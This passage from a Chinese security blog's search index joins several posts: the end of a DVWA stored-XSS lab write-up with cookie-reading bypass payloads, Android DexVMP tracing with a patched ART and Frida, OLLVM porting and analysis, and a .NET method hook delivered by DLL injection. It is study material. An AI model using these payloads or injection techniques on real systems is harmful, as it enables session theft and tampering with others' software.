((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\")); // Update database $query = \"INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );\"; $result = mysqli_query($GLOBALS[\"___mysqli_ston\"], $query ) or die( '\u003cpre\u003e' . ((is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_error($GLOBALS[\"___mysqli_ston\"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '\u003c/pre\u003e' ); //mysql_close(); } ?\u003e 上述对name的处理调用str_replace将script替换为空字符. 对message的处理调用addslashes转义用户输入的内容中的特殊字符串,调用htmlspecialchars将PHP中用于将特定字符转换为HTML实体,用来防止XSS. 通过BurpSuite抓包修改name字段内容如下: \u003cSCRIPT\u003ealert(document.cookie)\u003c/SCRIPT\u003e ","date":"2024-06-10","objectID":"/posts/web%E5%AE%89%E5%85%A8/dvwa%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/:11:2","tags":["Web安全"],"title":"DVWA通关记录","uri":"/posts/web%E5%AE%89%E5%85%A8/dvwa%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/"},{"categories":["Web安全"],"content":"High 服务端源码如下: \u003c?php if( isset( $_POST[ 'btnSign' ] ) ) { // Get input $message = trim( $_POST[ 'mtxMessage' ] ); $name = trim( $_POST[ 'txtName' ] ); // Sanitize message input $message = strip_tags( addslashes( $message ) ); $message = ((isset($GLOBALS[\"___mysqli_ston\"]) \u0026\u0026 is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"], $message ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\")); $message = htmlspecialchars( $message ); // Sanitize name input $name = preg_replace( '/\u003c(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $name ); $name = ((isset($GLOBALS[\"___mysqli_ston\"]) \u0026\u0026 is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"], $name ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\")); // Update database $query = \"INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );\"; $result = mysqli_query($GLOBALS[\"___mysqli_ston\"], $query ) or die( '\u003cpre\u003e' . ((is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_error($GLOBALS[\"___mysqli_ston\"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '\u003c/pre\u003e' ); //mysql_close(); } ?\u003e 对name的处理输入调用preg_replace进行正则过滤,可使用非script标签绕过 \u003cimg src=1 onerror='alert(document.cookie)'\u003e ","date":"2024-06-10","objectID":"/posts/web%E5%AE%89%E5%85%A8/dvwa%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/:11:3","tags":["Web安全"],"title":"DVWA通关记录","uri":"/posts/web%E5%AE%89%E5%85%A8/dvwa%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/"},{"categories":["Android壳世界"],"content":"概述 Android DexVMP主要有以下两种表现形式: 抽象出一个统一返回值和参数的函数,对这个函数进行VMP保护 onCreate Native化,对其进行VMP保护 Android DexVMP的实现原理就是对ART解释器进行自定义,壳代码运行在传统ART解释器下,被加固应用运行在自定义解释器下.对于这种情况,我们可以对其函数调用过程进行trace,通过分析某个函数内部调用的其他函数,然后借助Frida进行关键函数的Hook来帮助我们完成对VMP保护的函数进行快速分析,接下来将以Android13为例,进行ART的定制来完成函数调用关系的打印. ","date":"2023-06-19","objectID":"/posts/android/android%E5%A3%B3%E4%B8%96%E7%95%8C/android-dexvmp%E5%BF%AB%E9%80%9F%E5%88%86%E6%9E%90/:1:0","tags":["Android"],"title":"Android-DexVMP快速分析","uri":"/posts/android/android%E5%A3%B3%E4%B8%96%E7%95%8C/android-dexvmp%E5%BF%AB%E9%80%9F%E5%88%86%E6%9E%90/"},{"categories":["Android壳世界"],"content":"定制ART ","date":"2023-06-19","objectID":"/posts/android/android%E5%A3%B3%E4%B8%96%E7%95%8C/android-dexvmp%E5%BF%AB%E9%80%9F%E5%88%86%E6%9E%90/:2:0","tags":["Android"],"title":"Android-DexVMP快速分析","uri":"/posts/android/android%E5%A3%B3%E4%B8%96%E7%95%8C/android-dexvmp%E5%BF%AB%E9%80%9F%E5%88%86%E6%9E%90/"},{"categories":["Android壳世界"],"content":"Java调用关系 Java函数有以下两种执行模式: 解释模式 经过dex2oat编译后在quick模式执行 对于所有在解释模式下执行的函数都会经过interpreter.cc中的Execute函数. //http://aospxref.com/android-13.0.0_r3/xref/art/runtime/interpreter/interpreter.cc static inline JValue Execute( Thread* self, const CodeItemDataAccessor\u0026 accessor, ShadowFrame\u0026 shadow_frame, JValue result_register, bool stay_in_interpreter = false, bool from_deoptimize = false) REQUIRES_SHARED(Locks::mutator_lock_) { DCHECK(!shadow_frame.GetMethod()-\u003eIsAbstract()); DCHECK(!shadow_frame.GetMethod()-\u003eIsNative()); //---------------------------------------------------------- if (!stay_in_interpreter \u0026\u0026 !self-\u003eIsForceInterpreter()) { jit::Jit* jit = Runtime::Current()-\u003eGetJit(); if (jit != nullptr) { jit-\u003eMethodEntered(self, shadow_frame.GetMethod()); if (jit-\u003eCanInvokeCompiledCode(method)) { JValue result; // Pop the shadow frame before calling into compiled code. self-\u003ePopShadowFrame(); // Calculate the offset of the first input reg. The input registers are in the high regs. // It's ok to access the code item here since JIT code will have been touched by the // interpreter and compiler already. uint16_t arg_offset = accessor.RegistersSize() - accessor.InsSize(); ArtInterpreterToCompiledCodeBridge(self, nullptr, \u0026shadow_frame, arg_offset, \u0026result); // Push the shadow frame back as the caller will expect it. self-\u003ePushShadowFrame(\u0026shadow_frame); return result; } } } } ArtMethod* method = shadow_frame.GetMethod(); DCheckStaticState(self, method); // Lock counting is a special version of accessibility checks, and for simplicity and // reduction of template parameters, we gate it behind access-checks mode. DCHECK_IMPLIES(method-\u003eSkipAccessChecks(), !method-\u003eMustCountLocks()); VLOG(interpreter) \u003c\u003c \"Interpreting \" \u003c\u003c method-\u003ePrettyMethod(); return ExecuteSwitch( self, accessor, shadow_frame, result_register, /*interpret_one_instruction=*/ false); } 从Android13的Execute函数源码中可以看到,如果Java函数始终运行在解释模式下,那么最终所有流程会走到ExecuteSwitch函数中. ExecuteSwitch函数的内部流程如下: //http://aospxref.com/android-13.0.0_r3/xref/art/runtime/interpreter/interpreter.cc#ExecuteSwitch static JValue ExecuteSwitch(Thread* self, const CodeItemDataAccessor\u0026 accessor, ShadowFrame\u0026 shadow_frame, JValue result_register, bool interpret_one_instruction) REQUIRES_SHARED(Locks::mutator_lock_) //http://aospxref.com/android-13.0.0_r3/xref/art/runtime/interpreter/interpreter_switch_impl.h -\u003eALWAYS_INLINE JValue ExecuteSwitchImpl(Thread* self, const CodeItemDataAccessor\u0026 accessor, ShadowFrame\u0026 shadow_frame, JValue result_register, bool interpret_one_instruction) //http://aospxref.com/android-13.0.0_r3/xref/art/runtime/interpreter/interpreter_switch_impl-inl.h -\u003etemplate\u003cbool do_access_check, bool transaction_active\u003e void ExecuteSwitchImplCpp(SwitchImplContext* ctx) { Thread* self = ctx-\u003eself; const CodeItemDataAccessor\u0026 accessor = ctx-\u003eaccessor; ShadowFrame\u0026 shadow_frame = ctx-\u003eshadow_frame; self-\u003eVerifyStack(); uint32_t dex_pc = shadow_frame.GetDexPC(); const auto* const instrumentation = Runtime::Current()-\u003eGetInstrumentation(); const uint16_t* const insns = accessor.Insns(); const Instruction* next = Instruction::At(insns + dex_pc); DCHECK(!shadow_frame.GetForceRetryInstruction()) \u003c\u003c \"Entered interpreter from invoke without retry instruction being handled!\"; bool const interpret_one_instruction = ctx-\u003einterpret_one_instruction; while (true) { const Instruction* const inst = next; dex_pc = inst-\u003eGetDexPc(insns); shadow_frame.SetDexPC(dex_pc); TraceExecution(shadow_frame, inst, dex_pc); uint16_t inst_data = inst-\u003eFetch16(0); bool exit = false; bool success; // Moved outside to keep frames small under asan. if (InstructionHandler\u003cdo_access_check, transaction_active, Instruction::kInvalidFormat\u003e( ctx, instrumentation, self, shadow_frame, dex_pc, inst, inst_data, next, exit). Preamble()) { DCHECK_EQ(self-\u003eIsExceptionPending(), inst-\u003eOpcode(inst_data) == Instruction::MOVE_EXCEPTION); switch (inst-\u003eOpcode(inst_data)) { //这里可以看到对不同的OPCODE进行处理 #define OPCODE_CASE(OPCODE, OPCODE_NAME, NAME, FORMAT, i","date":"2023-06-19","objectID":"/posts/android/android%E5%A3%B3%E4%B8%96%E7%95%8C/android-dexvmp%E5%BF%AB%E9%80%9F%E5%88%86%E6%9E%90/:2:1","tags":["Android"],"title":"Android-DexVMP快速分析","uri":"/posts/android/android%E5%A3%B3%E4%B8%96%E7%95%8C/android-dexvmp%E5%BF%AB%E9%80%9F%E5%88%86%E6%9E%90/"},{"categories":["Android壳世界"],"content":"Jni调用关系 为了解决VMP实现的兼容性和复杂性问题,VMP会使用标准Jni调用java函数的流程来实现对invoke类型指令的解释执行. 解析invoke指令的参数部分,得到Methodldx 解析Dex结构,获得当前要调用的Methodldx的类名和函数属性 调用Jni的Findclass函数,获得对应类的JClass 调用Jni的GetMethodID或GetStaticMethodID得到函数的MethodID 调用Jni的CalIXXXMethod,完成对函数的调用 接下来我们以CallStaticIntMethod为例,来看下其内部调用流程. //http://aospxref.com/android-13.0.0_r3/xref/art/runtime/jni/jni_internal.cc static jint CallStaticIntMethod(JNIEnv* env, jclass, jmethodID mid, ...) //http://aospxref.com/android-13.0.0_r3/xref/art/runtime/reflection.cc -\u003eJValue InvokeWithVarArgs(const ScopedObjectAccessAlreadyRunnable\u0026 soa, jobject obj, ArtMethod* method, va_list args) REQUIRES_SHARED(Locks::mutator_lock_) -\u003evoid InvokeWithArgArray(const ScopedObjectAccessAlreadyRunnable\u0026 soa, ArtMethod* method, ArgArray* arg_array, JValue* result, const char* shorty) 我们可以在InvokeWithArgArray这个函数中进行插桩,来完成函数调用关系的打印. 插桩代码如下: void InvokeWithArgArray(const ScopedObjectAccessAlreadyRunnable\u0026 soa, ArtMethod* method, ArgArray* arg_array, JValue* result, const char* shorty) REQUIRES_SHARED(Locks::mutator_lock_) { uint32_t* args = arg_array-\u003eGetArray(); if (UNLIKELY(soa.Env()-\u003eIsCheckJniEnabled())) { CheckMethodArguments(soa.Vm(), method-\u003eGetInterfaceMethodIfProxy(kRuntimePointerSize), args); } //add //ArtMethod* native_method = *self-\u003eGetManagedStack()-\u003eGetTopQuickFrame(); ArtMethod* artMethod = nullptr; Thread* self = Thread::Current(); const ManagedStack* managedStack= self-\u003eGetManagedStack(); if(managedStack != nullptr){ ArtMethod** tmpartmethod= managedStack-\u003eGetTopQuickFrame(); if(tmpartmethod != nullptr){ artMethod = *tmpartmethod; } } if(artMethod != nullptr) { std::ostringstream oss; oss \u003c\u003c \"[InvokeWithArgArray]beforeCall caller:\\t\" \u003c\u003c artMethod-\u003ePrettyMethod() \u003c\u003c \"\\t--\u003ecalled:\\t\"\u003c\u003c method-\u003ePrettyMethod(); if(strstr(oss.str().c_str(),\"InvokeWithArgArrayFlag\")){ LOG(ERROR) \u003c\u003c oss.str(); } } //add method-\u003eInvoke(soa.Self(), args, arg_array-\u003eGetNumBytes(), result, shorty); //add if(artMethod != nullptr) { std::ostringstream oss; oss \u003c\u003c \"[InvokeWithArgArray]after Call caller:\\t\" \u003c\u003c artMethod-\u003ePrettyMethod() \u003c\u003c \"\\t--\u003ecalled:\\t\"\u003c\u003c method-\u003ePrettyMethod(); if(strstr(oss.str().c_str(),\"InvokeWithArgArrayFlag\")){ LOG(ERROR) \u003c\u003c oss.str(); } } //add } ","date":"2023-06-19","objectID":"/posts/android/android%E5%A3%B3%E4%B8%96%E7%95%8C/android-dexvmp%E5%BF%AB%E9%80%9F%E5%88%86%E6%9E%90/:2:2","tags":["Android"],"title":"Android-DexVMP快速分析","uri":"/posts/android/android%E5%A3%B3%E4%B8%96%E7%95%8C/android-dexvmp%E5%BF%AB%E9%80%9F%E5%88%86%E6%9E%90/"},{"categories":["Android壳世界"],"content":"Hook代码 上面我们对Android源码进行了修改,还需要借助Frida来完成函数调用关系的打印,对应的代码如下: function forceinterpreter() { var libartmodule = Process.getModuleByName(\"libart.so\"); var forceinterpreter_addr = libartmodule.getExportByName(\"forceinterpreter\"); console.log(\"forceinterpreter:\" + forceinterpreter_addr); var forceinterpreter = new NativeFunction(forceinterpreter_addr, \"void\", []); Interceptor.attach(forceinterpreter_addr, { onEnter: function (args) { console.log(\"go into forceinterpreter\"); }, onLeave: function (retval) { console.log(\"leave forceinterpreter\"); } }); forceinterpreter(); } function hook_start() { var libcModule = Process.getModuleByName(\"libc.so\"); var strstr = libcModule.getExportByName(\"strstr\"); Interceptor.attach(strstr, { onEnter: function (args) { this.arg0 = args[0]; this.arg1 = args[1]; this.method_name = ptr(this.arg0).readUtf8String(); this.call_name = ptr(this.arg1).readUtf8String(); if (this.call_name.indexOf(\"PerformCallFlag\") != -1) { console.log(this.method_name); } if (this.call_name.indexOf(\"InvokeWithArgArrayFlag\") != -1) { console.log(this.method_name); } }, onLeave: function (retval) { if (this.call_name.indexOf(\"InvokeWithArgArrayFlag\") != -1 || this.call_name.indexOf(\"PerformCallFlag\") != -1) { retval.replace(0); } } }) } function main() { forceinterpreter(); hook_start(); } setImmediate(main) ","date":"2023-06-19","objectID":"/posts/android/android%E5%A3%B3%E4%B8%96%E7%95%8C/android-dexvmp%E5%BF%AB%E9%80%9F%E5%88%86%E6%9E%90/:3:0","tags":["Android"],"title":"Android-DexVMP快速分析","uri":"/posts/android/android%E5%A3%B3%E4%B8%96%E7%95%8C/android-dexvmp%E5%BF%AB%E9%80%9F%E5%88%86%E6%9E%90/"},{"categories":["Android壳世界"],"content":"示例 这里我们以某VMP样本为例,进行函数调用关系的trace. 加固前代码如下: 加固后代码如下: 函数trace如下: ","date":"2023-06-19","objectID":"/posts/android/android%E5%A3%B3%E4%B8%96%E7%95%8C/android-dexvmp%E5%BF%AB%E9%80%9F%E5%88%86%E6%9E%90/:4:0","tags":["Android"],"title":"Android-DexVMP快速分析","uri":"/posts/android/android%E5%A3%B3%E4%B8%96%E7%95%8C/android-dexvmp%E5%BF%AB%E9%80%9F%E5%88%86%E6%9E%90/"},{"categories":["Android壳世界"],"content":"总结 VMP的加固强度很强,但是我们可以通过对Android解释模式以及Jni调用流程进行分析,在其中某些流程进行插桩并且和Frida进行结合,打印出被VMP保护函数的函数调用.然后再进一步分析,对关键函数进行Hook拿到我们想要的信息. ","date":"2023-06-19","objectID":"/posts/android/android%E5%A3%B3%E4%B8%96%E7%95%8C/android-dexvmp%E5%BF%AB%E9%80%9F%E5%88%86%E6%9E%90/:5:0","tags":["Android"],"title":"Android-DexVMP快速分析","uri":"/posts/android/android%E5%A3%B3%E4%B8%96%E7%95%8C/android-dexvmp%E5%BF%AB%E9%80%9F%E5%88%86%E6%9E%90/"},{"categories":["Android壳世界"],"content":"参考链接 VMP逆向—-仿method profiling跟踪jni函数执行 ","date":"2023-06-19","objectID":"/posts/android/android%E5%A3%B3%E4%B8%96%E7%95%8C/android-dexvmp%E5%BF%AB%E9%80%9F%E5%88%86%E6%9E%90/:6:0","tags":["Android"],"title":"Android-DexVMP快速分析","uri":"/posts/android/android%E5%A3%B3%E4%B8%96%E7%95%8C/android-dexvmp%E5%BF%AB%E9%80%9F%E5%88%86%E6%9E%90/"},{"categories":["LLVM"],"content":" 将OLLVM移植到LLVM源码中 LLVM源码编译 NDK下载 https://developer.android.google.cn/ndk/downloads?hl=zh-cn 这里需要注意一点的是下载的NDK版本要和上述移植的LLVM源码版本相近. 在NDK中也有clang编译器,可以查看下版本,看看是基于LLVM哪个版本进行编译的. 移植OLLVM到NDK中. 将OLLVM编译出来的bin、include和lib文件夹复制到上述下载的{NDK目录}/toolchains/llvm/prebuilt/linux-x86_64文件夹下 新建一个Android Native工程 在local.properties文件中配置NDK目录 ndk.dir=/home/luohun/Android/android-ndk-r21e 在Cpp同目录下的CMakeLists.txt文件中添加OLLVM命令 add_definitions(\"-mllvm -fla\") 正常进行工程编译即可 ","date":"2023-05-14","objectID":"/posts/llvm/%E7%A7%BB%E6%A4%8Dollvm%E5%88%B0ndk%E4%B8%AD/:0:0","tags":["LLVM"],"title":"移植OLLVM到NDK中","uri":"/posts/llvm/%E7%A7%BB%E6%A4%8Dollvm%E5%88%B0ndk%E4%B8%AD/"},{"categories":["Win相关"],"content":"概述 在正式开始之前,我们需要先了解以下几个概念: CLI(Common Language Infrastructure,通用语言框架):提供了一套可执行代码和它所运行需要的虚拟执行环境的规范. CLR(Common Language Runtime,公共语言运行时):和Java虚拟机一样也是一个运行时环境,负责资源管理(内存分配和垃圾收集),并保证应用和底层操作系统之间必要的分离.可以说微软的.NET基础CLR是CLI的一个实例. C++ /CLI:实现了C和.NET的无缝连接,可以使用C和C#混合的方式来完成应用程序代码的编写. .NET程序编译运行流程:将源代码编译为微软中间语言MSIL,运行的时候即时编译为本地机器语言,同时.NET代码运行时有一个CLR环境来管理程序. 对于Hook来说,首先关键的一步就是确定目标函数的地址,而.NET程序的Native函数地址是运行的时候即时编译的,函数地址不确定.但幸运的是我们可以通过C#的RuntimeMethodHandle.GetFunctionPointer()函数来获取编译后的Native函数地址,另外需要注意一点的就是在.NET中,假设函数没有被直接或间接使用,那函数就不会被编译.因此在使用上述接口获取编译后的Native函数地址之前,我们还需要使用C#中的System::Runtime::CompilerServices::RuntimeHelpers::PrepareMethod()函数来进行函数的编译. 通过上述描述,我们可以很轻易就想到用C++来完成Hook代码的编写,用C#来完成.NET程序函数编译地址的确定. ","date":"2023-05-08","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/net%E7%A8%8B%E5%BA%8Fhook%E7%9A%84%E5%8F%A6%E4%B8%80%E7%A7%8D%E4%BC%98%E9%9B%85%E5%AE%9E%E7%8E%B0/:1:0","tags":["Windows"],"title":".NET程序hook的另一种优雅实现-C++/CLI","uri":"/posts/windows%E7%9B%B8%E5%85%B3/net%E7%A8%8B%E5%BA%8Fhook%E7%9A%84%E5%8F%A6%E4%B8%80%E7%A7%8D%E4%BC%98%E9%9B%85%E5%AE%9E%E7%8E%B0/"},{"categories":["Win相关"],"content":"目标程序 假设我们要Hook的目标C#窗体应用程序如下: using System; using System.Windows.Forms; namespace CLuoHun { public partial class Form1 : Form { public Form1() { InitializeComponent(); } private void btnStatic_Click(object sender, EventArgs e) { TstStaticFunc(\"TstStaticFunc\"); } private void btnInstance_Click(object sender, EventArgs e) { TstInstanceFunc(\"TstInstanceFunc\"); } private void btnGeneric_Click(object sender, EventArgs e) { TstGenericFunc(\"TstGenericFunc\"); } //静态方法 public static void TstStaticFunc(String strMsg) { MessageBox.Show(strMsg); } //实例方法 private void TstInstanceFunc(String strMsg) { MessageBox.Show(strMsg); } //泛型方法 private void TstGenericFunc\u003cT\u003e(T strMsg) { MessageBox.Show(strMsg.ToString()); } } } 后面我们以静态方法TstStaticFunc、实例方法TstInstanceFunc以及泛型方法TstGenericFunc为例来展开讲解C++ /CLI Hook代码的编写. ","date":"2023-05-08","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/net%E7%A8%8B%E5%BA%8Fhook%E7%9A%84%E5%8F%A6%E4%B8%80%E7%A7%8D%E4%BC%98%E9%9B%85%E5%AE%9E%E7%8E%B0/:2:0","tags":["Windows"],"title":".NET程序hook的另一种优雅实现-C++/CLI","uri":"/posts/windows%E7%9B%B8%E5%85%B3/net%E7%A8%8B%E5%BA%8Fhook%E7%9A%84%E5%8F%A6%E4%B8%80%E7%A7%8D%E4%BC%98%E9%9B%85%E5%AE%9E%E7%8E%B0/"},{"categories":["Win相关"],"content":"Hook代码 创建一个C++ Dll项目,启用CLR支持 修改编译选项 在配置属性下C/C++的命令行中添加/Zc:twoPhase- Dll的Hook代码如下: #using \u003cmscorlib.dll\u003e #include \u003cmsclr\\marshal_cppstd.h\u003e using namespace System; using namespace std; using namespace Reflection; using namespace System::Runtime::InteropServices; using namespace msclr::interop; #include \u003cmemory\u003e #include \u003cstring\u003e #include \"Detours/include/LuoDetours.h\" #include \"OutputDebugString/OutDebuf.h\" void __clrcall MyStaticFunc(String^ strMsg) { //cli的string转c++ char* char* szMsg = (char*)(void*)Marshal::StringToHGlobalAnsi(strMsg).ToPointer(); MessageBoxA(NULL, \"MyStaticFunc\", szMsg, MB_OK); } void __clrcall MyInstanceFunc(Object% obj, String^ strMsg) { //cli的string转c++ char* char* szMsg = (char*)(void*)Marshal::StringToHGlobalAnsi(strMsg).ToPointer(); MessageBoxA(NULL, \"MyInstanceFunc\", szMsg, MB_OK); } void __clrcall MyGenericFunc(Object% obj, String^ strMsg) { //cli的string转c++ char* char* szMsg = (char*)(void*)Marshal::StringToHGlobalAnsi(strMsg).ToPointer(); MessageBoxA(NULL, \"MyGenericFunc\", szMsg, MB_OK); } DWORD WINAPI ThreadProc(LPVOID lpThreadParameter) { //①反射找到函数 Type^ type = Type::GetType(\"CLuoHun.Form1, CLuoHun\"); //静态方法 public static void TstStaticFunc(String strMsg) MethodInfo^ staticMethod = type-\u003eGetMethod(\"TstStaticFunc\", BindingFlags::Public | BindingFlags::Static); //实例方法 private void TstInstanceFunc(String strMsg) MethodInfo^ instanceMethod = type-\u003eGetMethod(\"TstInstanceFunc\", BindingFlags::NonPublic | BindingFlags::Instance); //泛型方法 private void TstGenericFunc\u003cT\u003e(T strMsg) MethodInfo^ genericMethodPre = type-\u003eGetMethod(\"TstGenericFunc\", BindingFlags::NonPublic | BindingFlags::Instance); MethodInfo^ genericMethod = genericMethodPre-\u003eMakeGenericMethod(String::typeid); //②JIT 编译函数 System::Runtime::CompilerServices::RuntimeHelpers::PrepareMethod(staticMethod-\u003eMethodHandle); System::Runtime::CompilerServices::RuntimeHelpers::PrepareMethod(instanceMethod-\u003eMethodHandle); System::Runtime::CompilerServices::RuntimeHelpers::PrepareMethod(genericMethod-\u003eMethodHandle); //③获取函数地址 void* staticMethodAddr = (void*)staticMethod-\u003eMethodHandle.GetFunctionPointer(); void* instanceMethodAddr = (void*)instanceMethod-\u003eMethodHandle.GetFunctionPointer(); void* genericMethodAddr = (void*)genericMethod-\u003eMethodHandle.GetFunctionPointer(); //DbgPrintf(\"TstStaticFunc address: 0x%x\", staticMethodAddr); //DbgPrintf(\"TstInstanceFunc address: 0x%x\", instanceMethodAddr); //DbgPrintf(\"TstGenericFunc address: 0x%x\", genericMethodAddr); //④Hook AddHook(\u0026(PVOID\u0026)staticMethodAddr, MyStaticFunc); AddHook(\u0026(PVOID\u0026)instanceMethodAddr, MyInstanceFunc); AddHook(\u0026(PVOID\u0026)genericMethodAddr, MyGenericFunc); return TRUE; } //#pragma unmanaged #pragma managed(push, off) //编译为native代码 BOOL APIENTRY DllMain( HMODULE hModule, DWORD dwReason, LPVOID lpReserved ) { if (dwReason == DLL_PROCESS_ATTACH) { DisableThreadLibraryCalls(hModule); ::CreateThread(NULL, NULL, ThreadProc, NULL, NULL, NULL); } else if (dwReason == DLL_PROCESS_DETACH) { } return TRUE; } #pragma managed(pop) 注意 对于Dll工程来说,需要使用pragma指令将DllMain函数编译为native代码 Hook函数的调用约定为__clrcall 对于实例函数的Hook,要多写一个Object参数 对于泛型方法,要调用MethodInfo.MakeGenericMethod函数为其提供具体的类型参数 将上述代码编写的Dll注入到目标C#程序中即可实现指定函数的Hook ","date":"2023-05-08","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/net%E7%A8%8B%E5%BA%8Fhook%E7%9A%84%E5%8F%A6%E4%B8%80%E7%A7%8D%E4%BC%98%E9%9B%85%E5%AE%9E%E7%8E%B0/:3:0","tags":["Windows"],"title":".NET程序hook的另一种优雅实现-C++/CLI","uri":"/posts/windows%E7%9B%B8%E5%85%B3/net%E7%A8%8B%E5%BA%8Fhook%E7%9A%84%E5%8F%A6%E4%B8%80%E7%A7%8D%E4%BC%98%E9%9B%85%E5%AE%9E%E7%8E%B0/"},{"categories":["Win相关"],"content":"总结 对.NET程序的Hook,当然也可以通过C#这种高级语言来完成,但是异常麻烦.C++ /CLI通过将托管环境和Native环境整合在一起,允许开发者在编写托管代码的同时,仍能直接访问Native代码,借助于C++操作底层代码的强大特性,我们可以很轻易的完成Hook操作. ","date":"2023-05-08","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/net%E7%A8%8B%E5%BA%8Fhook%E7%9A%84%E5%8F%A6%E4%B8%80%E7%A7%8D%E4%BC%98%E9%9B%85%E5%AE%9E%E7%8E%B0/:4:0","tags":["Windows"],"title":".NET程序hook的另一种优雅实现-C++/CLI","uri":"/posts/windows%E7%9B%B8%E5%85%B3/net%E7%A8%8B%E5%BA%8Fhook%E7%9A%84%E5%8F%A6%E4%B8%80%E7%A7%8D%E4%BC%98%E9%9B%85%E5%AE%9E%E7%8E%B0/"},{"categories":["Win相关"],"content":"参考链接 C++/CLI 托管C++、C++/CLI、CLR managed 和 unmanaged pragma C++/CLI实现inline hook .NET程序 AMSI 绕过之.Net API Hook ","date":"2023-05-08","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/net%E7%A8%8B%E5%BA%8Fhook%E7%9A%84%E5%8F%A6%E4%B8%80%E7%A7%8D%E4%BC%98%E9%9B%85%E5%AE%9E%E7%8E%B0/:5:0","tags":["Windows"],"title":".NET程序hook的另一种优雅实现-C++/CLI","uri":"/posts/windows%E7%9B%B8%E5%85%B3/net%E7%A8%8B%E5%BA%8Fhook%E7%9A%84%E5%8F%A6%E4%B8%80%E7%A7%8D%E4%BC%98%E9%9B%85%E5%AE%9E%E7%8E%B0/"},{"categories":["LLVM"],"content":"概述 BCF即虚假控制流,将原程序基本块进行拆分和克隆,利用不透明谓词将克隆的基本块作为不可达分支用来混淆静态代码,达到迷惑攻击者的目的. 这里的不透明谓词是指一个表达式,它的值在执行到某处时,对代码编写者来说是确定的,但是由于某种原因,编译器或者静态分析器无法推断出这个值,只能在运行时确定. 其技术实现过程如下: 虚假控制流后,在IDA中的示例如下: ","date":"2023-04-19","objectID":"/posts/llvm/ollvm%E7%A0%94%E7%A9%B6%E4%B9%8Bbcf/:1:0","tags":["LLVM"],"title":"OLLVM研究之BCF","uri":"/posts/llvm/ollvm%E7%A0%94%E7%A9%B6%E4%B9%8Bbcf/"},{"categories":["LLVM"],"content":"测试文件 #include \u003cstdlib.h\u003e int main(int argc, char** argv) { int a = atoi(argv[1]); if(a == 0) return 1; else return 10; return 0; } ","date":"2023-04-19","objectID":"/posts/llvm/ollvm%E7%A0%94%E7%A9%B6%E4%B9%8Bbcf/:2:0","tags":["LLVM"],"title":"OLLVM研究之BCF","uri":"/posts/llvm/ollvm%E7%A0%94%E7%A9%B6%E4%B9%8Bbcf/"},{"categories":["LLVM"],"content":"流程分析 ","date":"2023-04-19","objectID":"/posts/llvm/ollvm%E7%A0%94%E7%A9%B6%E4%B9%8Bbcf/:3:0","tags":["LLVM"],"title":"OLLVM研究之BCF","uri":"/posts/llvm/ollvm%E7%A0%94%E7%A9%B6%E4%B9%8Bbcf/"},{"categories":["LLVM"],"content":"入口函数 bcf的声明在ollvm/include/llvm/Transforms/Obfuscation/BogusControlFlow.h Pass *createBogus (); Pass *createBogus (bool flag); bcf的入口函数是runOnFunction,在ollvm/lib/Transforms/Obfuscation/BogusControlFlow.cpp virtual bool runOnFunction(Function \u0026F){ // Check if the percentage is correct if (ObfTimes \u003c= 0) { errs()\u003c\u003c\"BogusControlFlow application number -bcf_loop=x must be x \u003e 0\"; return false; } // Check if the number of applications is correct if ( !((ObfProbRate \u003e 0) \u0026\u0026 (ObfProbRate \u003c= 100)) ) { errs()\u003c\u003c\"BogusControlFlow application basic blocks percentage -bcf_prob=x must be 0 \u003c x \u003c= 100\"; return false; } std::vector\u003cBasicBlock *\u003e orginalBBs; // check for compatible for (BasicBlock \u0026bb : F.getBasicBlockList()) { if (isa\u003cInvokeInst\u003e(bb.getTerminator())) { return false; } } // If fla annotations if(toObfuscate(flag,\u0026F,\"bcf\")) { bogus(F); doF(*F.getParent()); return true; } return false; } // end of runOnFunction() ObfTimes是通过以下参数进行传递的,默认是1 //进行3次bcf混淆 -mllvm -bcf_loop=3 ObfProbRate是通过以下参数进行传递的,默认是30 //每个基本块有40%的概率进行bcf混淆 -mllvm -bcf_prob=40 toObfuscate函数用于判断是否需要进行bcf ","date":"2023-04-19","objectID":"/posts/llvm/ollvm%E7%A0%94%E7%A9%B6%E4%B9%8Bbcf/:3:1","tags":["LLVM"],"title":"OLLVM研究之BCF","uri":"/posts/llvm/ollvm%E7%A0%94%E7%A9%B6%E4%B9%8Bbcf/"},{"categories":["LLVM"],"content":"虚假控制流构造 bogus函数内部会遍历函数的所有基本块,然后调用addBogusFlow函数进行虚假控制流的添加,其关键逻辑代码如下: void bogus(Function \u0026F) { //①通过命令行传参(-mllvm -bcf_loop=3)来构建循环体,决定进行多少次bcf混淆 int NumObfTimes = ObfTimes; do{ //②保存该函数所有基本块 std::list\u003cBasicBlock *\u003e basicBlocks; for (Function::iterator i=F.begin();i!=F.end();++i) { basicBlocks.push_back(\u0026*i); } //③遍历所有基本块 while(!basicBlocks.empty()){ //④通过随机产生100以内的数来和命令行传参(-mllvm -bcf_prob=40)进行比较,决定该基本块是否进行bcf混淆 if((int)llvm::cryptoutils-\u003eget_range(100) \u003c= ObfProbRate){ //⑤调用addBogusFlow进行虚假控制流的添加 BasicBlock *basicBlock = basicBlocks.front(); addBogusFlow(basicBlock, F); } // remove the block from the list 